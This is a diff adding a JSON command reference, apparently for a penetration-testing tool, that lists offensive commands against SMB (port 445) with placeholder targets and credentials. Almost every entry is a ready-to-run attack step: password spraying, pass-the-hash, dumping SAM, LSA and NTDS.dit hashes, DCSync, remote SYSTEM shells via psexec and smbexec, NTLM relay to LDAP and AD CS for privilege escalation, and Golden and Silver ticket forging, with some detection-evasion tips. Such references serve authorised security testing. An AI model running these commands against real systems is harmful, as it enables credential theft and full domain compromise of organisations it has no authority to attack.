@@ -1,0 +1,553 @@
+{
+  "port": 445,
+  "protocol": "tcp",
+  "service": "SMB",
+  "description": "Server Message Block — file sharing, AD enumeration, credential extraction, lateral movement, relay attacks, and Kerberos ticket forging.",
+  "tools": [
+    {
+      "name": "NetExec (nxc) — SMB",
+      "description": "Swiss-army knife for SMB enumeration, credential validation, command execution, and post-exploitation.",
+      "commands": [
+        {
+          "title": "Null session — list shares",
+          "command": "nxc smb {{IP}} -u '' -p '' --shares",
+          "description": "Attempt anonymous/null session share enumeration."
+        },
+        {
+          "title": "Guest session — list shares",
+          "command": "nxc smb {{IP}} -u 'guest' -p '' --shares",
+          "description": "Attempt guest account share enumeration."
+        },
+        {
+          "title": "Authenticate & list shares",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --shares",
+          "description": "List accessible shares with valid credentials."
+        },
+        {
+          "title": "Pass-the-Hash — list shares",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -H '{{HASH}}' --shares",
+          "description": "List shares using NTLM hash authentication."
+        },
+        {
+          "title": "Enumerate users",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --users",
+          "description": "List all domain users via SAM-R or LDAP."
+        },
+        {
+          "title": "Enumerate groups",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --groups",
+          "description": "List all domain groups."
+        },
+        {
+          "title": "Enumerate users via RID brute-force",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --rid-brute",
+          "description": "Enumerate domain users via RID cycling (works even when SAM-R is restricted)."
+        },
+        {
+          "title": "RID brute with custom range",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --rid-brute --rid-range 500-10000",
+          "description": "Brute-force RIDs in a custom range for large domains."
+        },
+        {
+          "title": "Get password policy",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --pass-pol",
+          "description": "Retrieve domain password policy (lockout threshold, min length, complexity)."
+        },
+        {
+          "title": "Check local admin access",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --local-auth",
+          "description": "Test if credentials have local administrator privileges."
+        },
+        {
+          "title": "Dump SAM hashes",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --sam",
+          "description": "Dump local SAM database hashes (requires admin)."
+        },
+        {
+          "title": "Dump LSA secrets",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --lsa",
+          "description": "Dump LSA secrets including cached credentials (requires admin)."
+        },
+        {
+          "title": "Dump NTDS.dit (Domain Controller)",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --ntds",
+          "description": "Dump all domain hashes from NTDS.dit via DRSUAPI (requires DA on DC)."
+        },
+        {
+          "title": "Dump NTDS.dit via VSS",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --ntds vss",
+          "description": "Dump NTDS.dit using Volume Shadow Copy (alternative to DRSUAPI)."
+        },
+        {
+          "title": "Spider shares — spider_plus module",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M spider_plus",
+          "description": "Recursively spider all accessible shares and list files with metadata."
+        },
+        {
+          "title": "Spider & download all files",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M spider_plus -o DOWNLOAD_FLAG=True",
+          "description": "Spider shares and download all discovered files."
+        },
+        {
+          "title": "Spider specific share folder",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --spider {{SHARE}} --pattern '.'",
+          "description": "Spider a specific share for all files matching a pattern."
+        },
+        {
+          "title": "Execute CMD command (-x)",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x 'whoami /all'",
+          "description": "Execute a CMD command via SMB (requires admin)."
+        },
+        {
+          "title": "Execute PowerShell command (-X)",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -X 'Get-Process'",
+          "description": "Execute a PowerShell command via SMB (requires admin)."
+        },
+        {
+          "title": "Execute CMD with PtH",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -H '{{HASH}}' -x 'whoami'",
+          "description": "Execute a CMD command using pass-the-hash."
+        },
+        {
+          "title": "Enumerate active sessions",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --sessions",
+          "description": "List active SMB sessions on the target (see who is logged in)."
+        },
+        {
+          "title": "Enumerate logged-on users",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --loggedon-users",
+          "description": "List users currently logged on to the target machine."
+        },
+        {
+          "title": "Enumerate disks",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --disks",
+          "description": "List physical disks on the target."
+        },
+        {
+          "title": "Check for ZeroLogon (CVE-2020-1472)",
+          "command": "nxc smb {{IP}} -u '' -p '' -M zerologon",
+          "description": "Check if the Domain Controller is vulnerable to ZeroLogon."
+        },
+        {
+          "title": "Check for PetitPotam",
+          "command": "nxc smb {{IP}} -u '' -p '' -M petitpotam",
+          "description": "Check if the target is vulnerable to PetitPotam coercion."
+        },
+        {
+          "title": "Generate relay target list",
+          "command": "nxc smb {{IP}}/24 -u '{{USERNAME}}' -p '{{PASSWORD}}' --gen-relay-list relay_targets.txt",
+          "description": "Scan a subnet and generate a list of hosts without SMB signing (relay targets)."
+        },
+        {
+          "title": "Password spray — single password",
+          "command": "nxc smb {{IP}} -u {{USERLIST}} -p '{{PASSWORD}}' --continue-on-success",
+          "description": "Spray a single password against a list of users."
+        },
+        {
+          "title": "Password spray — multiple passwords",
+          "command": "nxc smb {{IP}} -u {{USERLIST}} -p {{WORDLIST}} --no-bruteforce --continue-on-success",
+          "description": "Test each user with its corresponding password from the list (line-by-line pairing)."
+        },
+        {
+          "title": "Enumerate with Kerberos auth",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -k --shares",
+          "description": "Enumerate shares using Kerberos authentication."
+        },
+        {
+          "title": "Dump SAM with PtH",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -H '{{HASH}}' --sam",
+          "description": "Dump SAM hashes using pass-the-hash authentication."
+        },
+        {
+          "title": "Dump NTDS with PtH",
+          "command": "nxc smb {{IP}} -u '{{USERNAME}}' -H '{{HASH}}' --ntds",
+          "description": "Dump NTDS.dit using pass-the-hash on a Domain Controller."
+        }
+      ]
+    },
+    {
+      "name": "psexec.py (Impacket)",
+      "description": "Remote shell via SMB by uploading a service binary. Creates a Windows service, executes commands, and returns output. Highly reliable but leaves artifacts.",
+      "commands": [
+        {
+          "title": "Interactive shell with password",
+          "command": "psexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a SYSTEM-level interactive shell via SMB service creation."
+        },
+        {
+          "title": "Interactive shell with PtH",
+          "command": "psexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Get a SYSTEM shell using pass-the-hash."
+        },
+        {
+          "title": "Interactive shell with Kerberos",
+          "command": "psexec.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}'",
+          "description": "Get a SYSTEM shell using Kerberos authentication (requires valid ccache)."
+        },
+        {
+          "title": "Execute single command",
+          "command": "psexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'whoami /all'",
+          "description": "Execute a single command via PsExec without dropping into a shell."
+        },
+        {
+          "title": "Execute command with PtH",
+          "command": "psexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}' 'ipconfig /all'",
+          "description": "Execute a single command using pass-the-hash."
+        },
+        {
+          "title": "Shell as local admin",
+          "command": "psexec.py './Administrator:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using a local administrator account."
+        },
+        {
+          "title": "Shell with custom service name",
+          "command": "psexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -service-name '{{SERVICE_NAME}}'",
+          "description": "Specify a custom service name (OPSEC — avoid default 'RemComSvc' detection)."
+        }
+      ]
+    },
+    {
+      "name": "smbexec.py (Impacket)",
+      "description": "Semi-interactive shell via SMB using a temporary service. Stealthier than psexec — does not drop a binary, uses cmd.exe output redirection.",
+      "commands": [
+        {
+          "title": "Shell with password",
+          "command": "smbexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a semi-interactive shell via SMB service."
+        },
+        {
+          "title": "Shell with PtH",
+          "command": "smbexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Get a shell using pass-the-hash."
+        },
+        {
+          "title": "Shell with Kerberos",
+          "command": "smbexec.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}'",
+          "description": "Get a shell using Kerberos authentication."
+        },
+        {
+          "title": "Execute single command",
+          "command": "smbexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'whoami'",
+          "description": "Execute a single command via smbexec."
+        },
+        {
+          "title": "Shell as local admin",
+          "command": "smbexec.py './Administrator:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using a local administrator account."
+        },
+        {
+          "title": "Shell with PtH as local admin",
+          "command": "smbexec.py -hashes ':{{HASH}}' './Administrator@{{IP}}'",
+          "description": "Get a shell as local admin using pass-the-hash."
+        }
+      ]
+    },
+    {
+      "name": "secretsdump.py (Impacket)",
+      "description": "Comprehensive credential extraction — SAM, LSA, NTDS.dit (DRSUAPI and VSS methods), DCC2 cached creds, machine account hashes, and Kerberos keys.",
+      "commands": [
+        {
+          "title": "Dump all secrets with password",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Extract SAM, LSA, and NTDS.dit hashes using password authentication."
+        },
+        {
+          "title": "Dump all secrets with PtH",
+          "command": "secretsdump.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Extract all secrets using pass-the-hash."
+        },
+        {
+          "title": "Dump all secrets with Kerberos",
+          "command": "secretsdump.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}'",
+          "description": "Extract all secrets using Kerberos authentication."
+        },
+        {
+          "title": "Dump NTDS.dit only (DRSUAPI — default)",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -just-dc",
+          "description": "Extract only NTDS.dit hashes via DRSUAPI replication (DCSync)."
+        },
+        {
+          "title": "Dump NTDS.dit — NTLM hashes only",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -just-dc-ntlm",
+          "description": "Extract only NTLM hashes from NTDS.dit (smaller output, faster)."
+        },
+        {
+          "title": "Dump NTDS.dit — single user (DCSync)",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -just-dc-user '{{TARGET_USER}}'",
+          "description": "DCSync a single user's hash from NTDS.dit."
+        },
+        {
+          "title": "Dump NTDS.dit via VSS",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -use-vss",
+          "description": "Extract NTDS.dit using Volume Shadow Copy instead of DRSUAPI."
+        },
+        {
+          "title": "Dump SAM and LSA only (workstation)",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -no-ntds",
+          "description": "Extract only SAM and LSA secrets without attempting NTDS.dit."
+        },
+        {
+          "title": "Parse local SAM/SYSTEM/SECURITY files",
+          "command": "secretsdump.py -sam {{SAM_FILE}} -system {{SYSTEM_FILE}} -security {{SECURITY_FILE}} LOCAL",
+          "description": "Parse locally saved registry hives (SAM, SYSTEM, SECURITY) offline."
+        },
+        {
+          "title": "Parse local NTDS.dit file",
+          "command": "secretsdump.py -ntds {{NTDS_FILE}} -system {{SYSTEM_FILE}} LOCAL",
+          "description": "Parse a locally saved NTDS.dit database with its SYSTEM hive."
+        },
+        {
+          "title": "Dump with history (old passwords)",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -just-dc -history",
+          "description": "Include password history hashes in the NTDS.dit dump."
+        },
+        {
+          "title": "Dump with output file",
+          "command": "secretsdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -outputfile secretsdump_output",
+          "description": "Save all extracted secrets to files (secretsdump_output.ntds, .sam, etc.)."
+        }
+      ]
+    },
+    {
+      "name": "ntlmrelayx.py (Impacket)",
+      "description": "NTLM relay attack framework. Captures and relays NTLM authentication to target services (SMB, LDAP, HTTP, MSSQL) for code execution, credential extraction, or AD privilege escalation.",
+      "commands": [
+        {
+          "title": "Relay to SMB — dump SAM",
+          "command": "ntlmrelayx.py -t smb://{{TARGET_IP}} -smb2support",
+          "description": "Relay captured NTLM auth to SMB target and dump SAM hashes."
+        },
+        {
+          "title": "Relay to SMB — execute command",
+          "command": "ntlmrelayx.py -t smb://{{TARGET_IP}} -smb2support -c 'whoami /all'",
+          "description": "Relay to SMB and execute a command on the target."
+        },
+        {
+          "title": "Relay to SMB — interactive shell",
+          "command": "ntlmrelayx.py -t smb://{{TARGET_IP}} -smb2support -i",
+          "description": "Relay to SMB and start an interactive shell (connect via nc localhost 11000)."
+        },
+        {
+          "title": "Relay to LDAP — escalate user",
+          "command": "ntlmrelayx.py -t ldap://{{TARGET_IP}} --escalate-user '{{USERNAME}}'",
+          "description": "Relay to LDAP and grant DCSync privileges to the specified user."
+        },
+        {
+          "title": "Relay to LDAP — delegate access (RBCD)",
+          "command": "ntlmrelayx.py -t ldap://{{TARGET_IP}} --delegate-access",
+          "description": "Relay to LDAP and configure resource-based constrained delegation for a new machine account."
+        },
+        {
+          "title": "Relay to LDAP — add computer account",
+          "command": "ntlmrelayx.py -t ldap://{{TARGET_IP}} --add-computer '{{COMPUTER_NAME}}' --add-computer-password '{{PASSWORD}}'",
+          "description": "Relay to LDAP and create a new machine account in the domain."
+        },
+        {
+          "title": "Relay to LDAPS",
+          "command": "ntlmrelayx.py -t ldaps://{{TARGET_IP}} --escalate-user '{{USERNAME}}'",
+          "description": "Relay to LDAPS (encrypted) for escalation — required when LDAP signing is enforced."
+        },
+        {
+          "title": "Relay to multiple targets from file",
+          "command": "ntlmrelayx.py -tf targets.txt -smb2support",
+          "description": "Relay to multiple targets listed in a file (one per line, e.g., smb://IP)."
+        },
+        {
+          "title": "Relay with SOCKS proxy",
+          "command": "ntlmrelayx.py -t smb://{{TARGET_IP}} -smb2support -socks",
+          "description": "Relay and keep the session alive as a SOCKS proxy (use with proxychains)."
+        },
+        {
+          "title": "Relay to HTTP (ADCS web enrollment)",
+          "command": "ntlmrelayx.py -t http://{{TARGET_IP}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+          "description": "Relay to AD CS web enrollment to request a certificate (ESC8 attack)."
+        },
+        {
+          "title": "Relay to MSSQL — execute query",
+          "command": "ntlmrelayx.py -t mssql://{{TARGET_IP}} -smb2support -q 'SELECT system_user;'",
+          "description": "Relay to MSSQL and execute a SQL query."
+        },
+        {
+          "title": "Relay with IPv6 (mitm6 combo)",
+          "command": "ntlmrelayx.py -6 -t ldaps://{{TARGET_IP}} -wh wpad.{{DOMAIN}} --delegate-access",
+          "description": "Relay IPv6 WPAD auth (combine with mitm6) to LDAPS for delegation attack."
+        }
+      ]
+    },
+    {
+      "name": "ticketer.py (Impacket)",
+      "description": "Forge Kerberos tickets — Golden Tickets (krbtgt hash, domain-wide access) and Silver Tickets (service hash, single-service access).",
+      "commands": [
+        {
+          "title": "Forge Golden Ticket",
+          "command": "ticketer.py -nthash '{{KRBTGT_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' '{{USERNAME}}'",
+          "description": "Create a Golden Ticket using the krbtgt NTLM hash (full domain compromise)."
+        },
+        {
+          "title": "Forge Golden Ticket with AES key",
+          "command": "ticketer.py -aesKey '{{AES256_KEY}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' '{{USERNAME}}'",
+          "description": "Create a Golden Ticket using the krbtgt AES-256 key (stealthier, avoids RC4 detection)."
+        },
+        {
+          "title": "Forge Golden Ticket with extra SIDs",
+          "command": "ticketer.py -nthash '{{KRBTGT_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -extra-sid '{{ENTERPRISE_ADMINS_SID}}' '{{USERNAME}}'",
+          "description": "Create a Golden Ticket with extra SIDs (e.g., Enterprise Admins for cross-domain access)."
+        },
+        {
+          "title": "Forge Silver Ticket for CIFS (SMB)",
+          "command": "ticketer.py -nthash '{{MACHINE_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -spn 'cifs/{{TARGET_HOSTNAME}}.{{DOMAIN}}' '{{USERNAME}}'",
+          "description": "Create a Silver Ticket for SMB access to a specific host."
+        },
+        {
+          "title": "Forge Silver Ticket for HTTP (WinRM/PSRP)",
+          "command": "ticketer.py -nthash '{{MACHINE_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -spn 'http/{{TARGET_HOSTNAME}}.{{DOMAIN}}' '{{USERNAME}}'",
+          "description": "Create a Silver Ticket for WinRM/HTTP access to a specific host."
+        },
+        {
+          "title": "Forge Silver Ticket for MSSQL",
+          "command": "ticketer.py -nthash '{{SERVICE_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -spn 'MSSQLSvc/{{TARGET_HOSTNAME}}.{{DOMAIN}}:1433' '{{USERNAME}}'",
+          "description": "Create a Silver Ticket for MSSQL access."
+        },
+        {
+          "title": "Use forged ticket (export to KRB5CCNAME)",
+          "command": "export KRB5CCNAME={{USERNAME}}.ccache",
+          "description": "Set the Kerberos ccache environment variable to use the forged ticket with Impacket tools."
+        }
+      ]
+    },
+    {
+      "name": "getarch.py (Impacket)",
+      "description": "Remotely determine the OS architecture (32-bit vs 64-bit) of a Windows target via RPC.",
+      "commands": [
+        {
+          "title": "Get OS architecture",
+          "command": "getarch.py -target {{IP}}",
+          "description": "Determine if the target is running 32-bit or 64-bit Windows."
+        },
+        {
+          "title": "Get architecture for multiple targets",
+          "command": "getarch.py -target {{IP}}/24",
+          "description": "Enumerate OS architecture across a subnet."
+        }
+      ]
+    },
+    {
+      "name": "smbclient",
+      "description": "Interactive SMB client for browsing, downloading, and uploading files to network shares.",
+      "commands": [
+        {
+          "title": "List shares (anonymous)",
+          "command": "smbclient -L //{{IP}} -N",
+          "description": "List available shares with no credentials."
+        },
+        {
+          "title": "List shares (authenticated)",
+          "command": "smbclient -L //{{IP}} -U '{{USERNAME}}%{{PASSWORD}}'",
+          "description": "List available shares with valid credentials."
+        },
+        {
+          "title": "Connect to a share",
+          "command": "smbclient //{{IP}}/{{SHARE}} -U '{{USERNAME}}%{{PASSWORD}}'",
+          "description": "Open an interactive session on a specific share."
+        },
+        {
+          "title": "Connect with null session",
+          "command": "smbclient //{{IP}}/{{SHARE}} -N",
+          "description": "Connect to a share anonymously."
+        },
+        {
+          "title": "Connect with PtH",
+          "command": "smbclient //{{IP}}/{{SHARE}} -U '{{USERNAME}}' --pw-nt-hash '{{HASH}}'",
+          "description": "Connect to a share using an NTLM hash."
+        },
+        {
+          "title": "Download all files recursively",
+          "command": "smbclient //{{IP}}/{{SHARE}} -U '{{USERNAME}}%{{PASSWORD}}' -c 'recurse ON; prompt OFF; mget *'",
+          "description": "Download all files from a share recursively."
+        },
+        {
+          "title": "Upload a file",
+          "command": "smbclient //{{IP}}/{{SHARE}} -U '{{USERNAME}}%{{PASSWORD}}' -c 'put {{LOCAL_FILE}} {{REMOTE_PATH}}'",
+          "description": "Upload a local file to the remote share."
+        },
+        {
+          "title": "Execute inline commands",
+          "command": "smbclient //{{IP}}/{{SHARE}} -U '{{USERNAME}}%{{PASSWORD}}' -c 'ls; cd {{DIRECTORY}}; ls; get {{FILENAME}}'",
+          "description": "Run multiple SMB commands in a single non-interactive session."
+        }
+      ]
+    },
+    {
+      "name": "smbmap",
+      "description": "SMB share enumeration and file operations with permission visibility, command execution, and recursive searching.",
+      "commands": [
+        {
+          "title": "List shares (null session)",
+          "command": "smbmap -H {{IP}} -u '' -p ''",
+          "description": "Enumerate shares and permissions with null authentication."
+        },
+        {
+          "title": "List shares (authenticated)",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Enumerate shares and permissions with valid credentials."
+        },
+        {
+          "title": "List shares with PtH",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{HASH}}:{{HASH}}'",
+          "description": "Enumerate shares using an NTLM hash."
+        },
+        {
+          "title": "Recursive file listing",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -R",
+          "description": "List all files across all accessible shares recursively."
+        },
+        {
+          "title": "Recursive listing of specific share",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -R '{{SHARE}}'",
+          "description": "Recursively list files in a specific share."
+        },
+        {
+          "title": "Download a file",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --download '{{SHARE}}\\{{FILEPATH}}'",
+          "description": "Download a file from a specific share path."
+        },
+        {
+          "title": "Upload a file",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --upload '{{LOCAL_FILE}}' '{{SHARE}}\\{{REMOTE_PATH}}'",
+          "description": "Upload a local file to a remote share."
+        },
+        {
+          "title": "Execute a command",
+          "command": "smbmap -H {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x 'whoami /all'",
+          "description": "Execute a command on the target via SMB (requires admin)."
+        }
+      ]
+    },
+    {
+      "name": "enum4linux-ng",
+      "description": "Next-generation NetBIOS/SMB enumeration — automates user, share, group, policy, and OS discovery.",
+      "commands": [
+        {
+          "title": "Full enumeration (anonymous)",
+          "command": "enum4linux-ng -A {{IP}}",
+          "description": "Run all enumeration modules with no credentials."
+        },
+        {
+          "title": "Full enumeration (authenticated)",
+          "command": "enum4linux-ng -A -u '{{USERNAME}}' -p '{{PASSWORD}}' {{IP}}",
+          "description": "Run all enumeration modules with valid credentials."
+        },
+        {
+          "title": "Full enumeration with JSON output",
+          "command": "enum4linux-ng -A -u '{{USERNAME}}' -p '{{PASSWORD}}' {{IP}} -oJ enum4linux_output",
+          "description": "Run full enumeration and save results as JSON."
+        },
+        {
+          "title": "Full enumeration with YAML output",
+          "command": "enum4linux-ng -A -u '{{USERNAME}}' -p '{{PASSWORD}}' {{IP}} -oY enum4linux_output",
+          "description": "Run full enumeration and save results as YAML."
+        }
+      ]
+    }
+  ]
+}
